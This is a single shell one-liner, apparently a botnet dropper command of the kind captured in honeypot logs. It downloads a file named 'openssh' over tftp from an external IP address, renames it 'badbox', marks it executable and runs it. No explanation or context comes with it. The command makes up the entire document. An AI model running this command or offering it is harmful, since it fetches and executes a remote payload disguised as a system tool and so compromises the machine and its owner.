cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 185.55.218.125;cat openssh >badbox;chmod +x *;./badbox
